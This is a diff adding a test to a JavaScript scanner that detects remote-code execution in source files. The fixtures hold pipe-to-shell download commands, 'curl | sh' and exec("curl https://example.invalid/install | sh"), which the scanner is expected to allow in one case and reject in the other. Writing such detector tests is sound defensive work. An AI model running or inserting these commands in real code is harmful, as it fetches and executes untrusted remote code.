@@ -40,3 +40,8 @@ test('allows remote-code examples in comments while rejecting executable stateme
   const directory = await fixture({ 'src/main.ts': '// npx esbuild\nconst command = "curl | sh";\nexport const local = true;' });
   await assert.doesNotReject(scanRemoteCode(directory, ['src/main.ts']));
 });
+
+test('rejects a shell-pipe download passed to a JavaScript process executor', async () => {
+  const directory = await fixture({ 'src/main.ts': 'exec("curl https://example.invalid/install | sh");' });
+  await assert.rejects(scanRemoteCode(directory, ['src/main.ts']), /shell-pipe download/);
+});
